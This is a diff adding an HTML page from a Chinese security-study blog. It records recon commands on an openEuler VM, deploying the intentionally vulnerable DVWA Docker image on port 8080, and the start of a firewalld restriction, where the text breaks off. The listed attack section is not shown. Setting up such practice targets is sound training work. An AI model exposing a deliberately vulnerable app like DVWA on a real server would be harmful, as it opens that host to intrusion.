@@ -1,0 +1,1502 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="一、环境侦测#1.1 Linux系统内核信息#[root@xnwlaqbc ~]# uname -aLinux xnwlaqbc 5.10.0-216.0.0.115.oe2203sp4.x86_64 #1 SMP Thu Jun 27 15:13:44 CST 2024 x86_64 x86_64 x86_64 GNU/Linux[root@xnwlaqbc ~]# hostnamectlStatic hostname: xnwlaqbcIcon name: computer-vmChassis: vmMachine ID: 16bd4a31931045a6b7abcfa9100d1164Boot ID: 043a5f3240d1408199b437ff1b6d1611Virtualization: kvmOperating System: openEuler 22.03 (LTS-SP4)Kernel: Linux 5.10.0-216.0.0.115.oe2203sp4.x86_64Architecture: x86-64Hardware Vendor: QEMUHardware Model: Standard PC _i440FX &#43; PIIX, 1996_[root@xnwlaqbc ~]# cat /proc/versionLinux version 5.10.0-216.0.0.115.oe2203sp4.x86_64 (root@dc-64g.compass-ci) (gcc_old (GCC) 10.3.1, GNU ld (GNU Binutils) 2.37) #1 SMP Thu Jun 27 15:13:44 CST 20241.2 docker部署#思路：下载docker压缩包，下载dvwa的docker包，在服务器上部署
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2&#43;%E6%94%BB%E5%87%BB%E5%85%A8%E6%B5%81%E7%A8%8B/">
+  <meta property="og:site_name" content="vnccer">
+  <meta property="og:title" content="xnwlaqbc靶机部署&#43;攻击全流程">
+  <meta property="og:description" content="一、环境侦测#1.1 Linux系统内核信息#[root@xnwlaqbc ~]# uname -aLinux xnwlaqbc 5.10.0-216.0.0.115.oe2203sp4.x86_64 #1 SMP Thu Jun 27 15:13:44 CST 2024 x86_64 x86_64 x86_64 GNU/Linux[root@xnwlaqbc ~]# hostnamectlStatic hostname: xnwlaqbcIcon name: computer-vmChassis: vmMachine ID: 16bd4a31931045a6b7abcfa9100d1164Boot ID: 043a5f3240d1408199b437ff1b6d1611Virtualization: kvmOperating System: openEuler 22.03 (LTS-SP4)Kernel: Linux 5.10.0-216.0.0.115.oe2203sp4.x86_64Architecture: x86-64Hardware Vendor: QEMUHardware Model: Standard PC _i440FX &#43; PIIX, 1996_[root@xnwlaqbc ~]# cat /proc/versionLinux version 5.10.0-216.0.0.115.oe2203sp4.x86_64 (root@dc-64g.compass-ci) (gcc_old (GCC) 10.3.1, GNU ld (GNU Binutils) 2.37) #1 SMP Thu Jun 27 15:13:44 CST 20241.2 docker部署#思路：下载docker压缩包，下载dvwa的docker包，在服务器上部署">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+    <meta property="article:published_time" content="2026-04-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-04-01T00:00:00+00:00">
+
+
+  <meta itemprop="name" content="xnwlaqbc靶机部署&#43;攻击全流程">
+  <meta itemprop="description" content="一、环境侦测#1.1 Linux系统内核信息#[root@xnwlaqbc ~]# uname -aLinux xnwlaqbc 5.10.0-216.0.0.115.oe2203sp4.x86_64 #1 SMP Thu Jun 27 15:13:44 CST 2024 x86_64 x86_64 x86_64 GNU/Linux[root@xnwlaqbc ~]# hostnamectlStatic hostname: xnwlaqbcIcon name: computer-vmChassis: vmMachine ID: 16bd4a31931045a6b7abcfa9100d1164Boot ID: 043a5f3240d1408199b437ff1b6d1611Virtualization: kvmOperating System: openEuler 22.03 (LTS-SP4)Kernel: Linux 5.10.0-216.0.0.115.oe2203sp4.x86_64Architecture: x86-64Hardware Vendor: QEMUHardware Model: Standard PC _i440FX &#43; PIIX, 1996_[root@xnwlaqbc ~]# cat /proc/versionLinux version 5.10.0-216.0.0.115.oe2203sp4.x86_64 (root@dc-64g.compass-ci) (gcc_old (GCC) 10.3.1, GNU ld (GNU Binutils) 2.37) #1 SMP Thu Jun 27 15:13:44 CST 20241.2 docker部署#思路：下载docker压缩包，下载dvwa的docker包，在服务器上部署">
+  <meta itemprop="datePublished" content="2026-04-01T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-04-01T00:00:00+00:00">
+  <meta itemprop="wordCount" content="718">
+
+<title>xnwlaqbc靶机部署&#43;攻击全流程 | vnccer</title>
+<link rel="icon" href="/ak47.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2&#43;%E6%94%BB%E5%87%BB%E5%85%A8%E6%B5%81%E7%A8%8B/">
+<link rel="stylesheet" href="/book.min.736951ca3ba5472b01b559ccf11c0bd72daa52528001c9a2789c1ea4a2c2c765.css" integrity="sha256-c2lRyjulRysBtVnM8RwL1y2qUlKAAcmieJwepKLCx2U=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.e34e2a222af654ef2b33a86a7eeff2b0a086850d84f557bea3aad0d7167187c7.js" integrity="sha256-404qIir2VO8rM6hqfu/ysKCGhQ2E9Ve&#43;o6rQ1xZxh8c=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-8930de0c5beda9ae1324d8e974f81d1e" class="toggle" checked />
+    <label for="section-8930de0c5beda9ae1324d8e974f81d1e" class="flex">
+      <a href="/docs/cybersecurity/" class="">
+        网安</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d92418954b947655c2de9db21774a8cc" class="toggle" checked />
+    <label for="section-d92418954b947655c2de9db21774a8cc" class="flex">
+      <a role="button" class="">
+        xnwlaqbc靶机记录</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2&#43;%E6%94%BB%E5%87%BB%E5%85%A8%E6%B5%81%E7%A8%8B/" class="active">
+      xnwlaqbc靶机部署&#43;攻击全流程</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-755697504a2fe68087c290f83d929a6c" class="toggle"  />
+    <label for="section-755697504a2fe68087c290f83d929a6c" class="flex">
+      <a role="button" class="">
+        DVWA</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/DVWA/" class="">
+      DVWA全难度</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-440df364fda34dee6eb8dbb8bf54c0be" class="toggle"  />
+    <label for="section-440df364fda34dee6eb8dbb8bf54c0be" class="flex">
+      <a role="button" class="">
+        Vulnerabilities</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/Apache-Log4j2CVE-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/" class="">
+      基于docker的log4j2（CVE-2021-44228）漏洞（失败）</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/log4j2.8.1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="">
+      log4j2.8.1漏洞复现</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-0a2f5b9129642a4909478fdeb2bc202e" class="toggle"  />
+    <label for="section-0a2f5b9129642a4909478fdeb2bc202e" class="flex">
+      <a role="button" class="">
+        VULNHUB</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-503a003a1f0020ea9e857111fe72b746" class="toggle"  />
+    <label for="section-503a003a1f0020ea9e857111fe72b746" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-ICA_1/" class="">
+      Vulnhub Ica 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Beelzebub_1/" class="">
+      Beelzebub: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Empire_Breakout/" class="">
+      Empire Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-jangow_1.0.1/" class="">
+      jangow 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Napping-1.0.1/" class="">
+      Napping: 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Noob_1/" class="">
+      Noob: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-The-planets_earth/" class="">
+      The planets earth</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fbe66aa168d91291660fa4890e0caf96" class="toggle"  />
+    <label for="section-fbe66aa168d91291660fa4890e0caf96" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub-Thales/" class="">
+      Thales</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub-Empire_lupinone/vulnhub-Empire_lupinone/" class="">
+      Empire lupinone</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-44d06050e861867b08816ac7b41bc098" class="toggle"  />
+    <label for="section-44d06050e861867b08816ac7b41bc098" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6ccb82f673039402d87957a0215871d7" class="toggle"  />
+    <label for="section-6ccb82f673039402d87957a0215871d7" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e0d169006dece34d6002b6d9d8f8c6d8" class="toggle"  />
+    <label for="section-e0d169006dece34d6002b6d9d8f8c6d8" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/CTF/easy/CTF-web-low/" class="">
+      web-low</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6ecffae0aff6917133e7910d8ae47ce6" class="toggle"  />
+    <label for="section-6ecffae0aff6917133e7910d8ae47ce6" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-92481376b3688992fd4bd02f22611062" class="toggle"  />
+    <label for="section-92481376b3688992fd4bd02f22611062" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c4a8d9ea3b5e6163e868446590d1d1fc" class="toggle"  />
+    <label for="section-c4a8d9ea3b5e6163e868446590d1d1fc" class="flex">
+      <a href="/docs/papers/" class="">
+        论文</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT/ET-BERT/" class="">
+      ET-BERT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT/ET-BERT%E5%A4%8D%E7%8E%B0/" class="">
+      ET-BERT复现</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E5%9F%BA%E4%BA%8E%E7%AA%81%E5%8F%91%E7%89%B9%E5%BE%81%E8%AF%8D%E5%85%83%E8%87%AA%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/" class="">
+      基于突发特征词元自学习的未知加密恶意流量检测方法</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-0322fd2da3e27f54e6647ac98dce6412" class="toggle"  />
+    <label for="section-0322fd2da3e27f54e6647ac98dce6412" class="flex">
+      <a href="/docs/skills/" class="">
+        技能</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
+      anaconda环境配置</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/kali-linux/" class="">
+      kali linux基础</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/SwitchyOmega-mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" class="">
+      SwitchyOmega mv3操作记录</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/win-&#43;-r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" class="">
+      win &#43; r常用指令</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali-linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/" class="">
+      基于vmware的kali linux下的docker部署(坑多)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E7%BD%91%E7%AB%99%E6%9E%84%E5%BB%BA/" class="">
+      网站构建</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-46cca3cee31003e60d06ca1be37ae652" class="toggle"  />
+    <label for="section-46cca3cee31003e60d06ca1be37ae652" class="flex">
+      <a role="button" class="">
+        导航门户</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E9%9D%B6%E5%9C%BA/" class="">
+      靶场</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E8%AE%BA%E6%96%87/" class="">
+      论文</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E5%B7%A5%E4%BD%9C/" class="">
+      工作</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Function/" class="">
+      Function</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/AI/" class="">
+      AI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Life/" class="">
+      Life</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E5%B9%B3%E5%8F%B0/" class="">
+      平台</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E6%9C%BA%E5%9C%BA/" class="">
+      机场</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a>
+      Shortcodes</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/asciinema/" class="">
+      Asciinema</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">
+      Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">
+      Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">
+      Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-be0ad0cb4491738803198fdeca347a1c" class="toggle"  />
+    <label for="section-be0ad0cb4491738803198fdeca347a1c" class="flex">
+      <a role="button" class="">
+        Experimental</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/experimental/badges/" class="">
+      Badges</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/experimental/cards/" class="">
+      Cards</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/experimental/images/" class="">
+      Images</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">
+      Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">
+      Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/steps/" class="">
+      Steps</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">
+      Tabs</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">
+      KaTeX</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+<ul><li><a href="/posts/" title="Blog">Blog</a></li><li><a href="https://github.com/vnccer" target="_blank" rel="noopener">Github</a></li></ul>
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>xnwlaqbc靶机部署&#43;攻击全流程</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#一环境侦测">一、环境侦测</a>
+      <ul>
+        <li><a href="#11-linux系统内核信息">1.1 Linux系统内核信息</a></li>
+        <li><a href="#12-docker部署">1.2 docker部署</a></li>
+        <li><a href="#13-加载dvwa镜像">1.3 加载dvwa镜像</a></li>
+        <li><a href="#14-访问靶机">1.4 访问靶机</a></li>
+        <li><a href="#15-限制访问ip">1.5 限制访问IP</a>
+          <ul>
+            <li><a href="#但是遇到docker端口绕过重新配置">但是遇到docker端口绕过，重新配置：</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#二渗透">二、渗透</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="一环境侦测">一、环境侦测<a class="anchor" href="#%e4%b8%80%e7%8e%af%e5%a2%83%e4%be%a6%e6%b5%8b">#</a></h1>
+<h2 id="11-linux系统内核信息">1.1 Linux系统内核信息<a class="anchor" href="#11-linux%e7%b3%bb%e7%bb%9f%e5%86%85%e6%a0%b8%e4%bf%a1%e6%81%af">#</a></h2>
+<pre tabindex="0"><code>[root@xnwlaqbc ~]# uname -a
+Linux xnwlaqbc 5.10.0-216.0.0.115.oe2203sp4.x86_64 #1 SMP Thu Jun 27 15:13:44 CST 2024 x86_64 x86_64 x86_64 GNU/Linux
+
+[root@xnwlaqbc ~]# hostnamectl
+ Static hostname: xnwlaqbc
+       Icon name: computer-vm
+         Chassis: vm
+      Machine ID: 16bd4a31931045a6b7abcfa9100d1164
+         Boot ID: 043a5f3240d1408199b437ff1b6d1611
+  Virtualization: kvm
+Operating System: openEuler 22.03 (LTS-SP4)
+          Kernel: Linux 5.10.0-216.0.0.115.oe2203sp4.x86_64
+    Architecture: x86-64
+ Hardware Vendor: QEMU
+  Hardware Model: Standard PC _i440FX + PIIX, 1996_
+
+[root@xnwlaqbc ~]# cat /proc/version
+Linux version 5.10.0-216.0.0.115.oe2203sp4.x86_64 (root@dc-64g.compass-ci) (gcc_old (GCC) 10.3.1, GNU ld (GNU Binutils) 2.37) #1 SMP Thu Jun 27 15:13:44 CST 2024</code></pre><h2 id="12-docker部署">1.2 docker部署<a class="anchor" href="#12-docker%e9%83%a8%e7%bd%b2">#</a></h2>
+<blockquote class='book-hint '>
+<p>思路：下载<code>docker</code>压缩包，下载<code>dvwa</code>的docker包，在服务器上部署</p>
+</blockquote><div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker pull vulnerables/web-dvwa
+</span></span><span style="display:flex;"><span>docker save -o dvwa_image.tar vulnerables/web-dvwa</span></span></code></pre></div><p><code>https://download.docker.com/linux/static/stable/x86_64/</code>下载<code>docker-29.3.1.tgz</code></p>
+<p>把<code>docekr-29.3.1.tgz</code>和<code>dvwa_imgage.tar</code>丢进<code>dvwa</code>文件夹</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#78787e"># 解压二进制包</span>
+</span></span><span style="display:flex;"><span>tar -xvf docker-29.3.1.tgz
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 将可执行文件移动到系统路径</span>
+</span></span><span style="display:flex;"><span>cp docker/* /usr/bin/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 启动 Docker 守护进程（因为是别人的服务器，建议手动后台运行，不写 systemd 也可以）</span>
+</span></span><span style="display:flex;"><span>dockerd &amp;</span></span></code></pre></div><h2 id="13-加载dvwa镜像">1.3 加载dvwa镜像<a class="anchor" href="#13-%e5%8a%a0%e8%bd%bddvwa%e9%95%9c%e5%83%8f">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span><span style="color:#78787e"># 加载镜像</span>
+</span></span><span style="display:flex;"><span>docker load -i dvwa_image.tar
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 检查镜像，镜像名为vulnerables/web-dvwa:latest</span>
+</span></span><span style="display:flex;"><span>docker images
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 元神启动！</span>
+</span></span><span style="display:flex;"><span>docker run --name my-dvwa -d -p 8080:80 -it vulnerables/web-dvwa:latest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 检查容器</span>
+</span></span><span style="display:flex;"><span>docker ps</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>root@xnwlaqbc dvwa<span style="color:#ff6ac1">]</span><span style="color:#78787e"># docker ps</span>
+</span></span><span style="display:flex;"><span>CONTAINER ID   IMAGE                         COMMAND      CREATED         STATUS         PORTS                                     NAMES
+</span></span><span style="display:flex;"><span>cb13b511080a   vulnerables/web-dvwa:latest   <span style="color:#5af78e">&#34;/main.sh&#34;</span>   <span style="color:#ff9f43">8</span> seconds ago   Up <span style="color:#ff9f43">7</span> seconds   0.0.0.0:8080-&gt;80/tcp, <span style="color:#ff6ac1">[</span>::<span style="color:#ff6ac1">]</span>:8080-&gt;80/tcp   my-dvwa</span></span></code></pre></div><h2 id="14-访问靶机">1.4 访问靶机<a class="anchor" href="#14-%e8%ae%bf%e9%97%ae%e9%9d%b6%e6%9c%ba">#</a></h2>
+<p>http://靶机ip:8080</p>
+<h2 id="15-限制访问ip">1.5 限制访问IP<a class="anchor" href="#15-%e9%99%90%e5%88%b6%e8%ae%bf%e9%97%aeip">#</a></h2>
+<pre tabindex="0"><code>[root@xnwlaqbc ~]# who
+root     pts/1        2026-03-29 14:31 (172.31.171.155)
+root     pts/2        2026-03-29 15:09 (172.31.171.162)
+
+# 启用 firewalld 并设置开机自启
+systemctl start firewalld
+systemctl enable firewalld
+
+# 允许指定两个IP访问8080端口
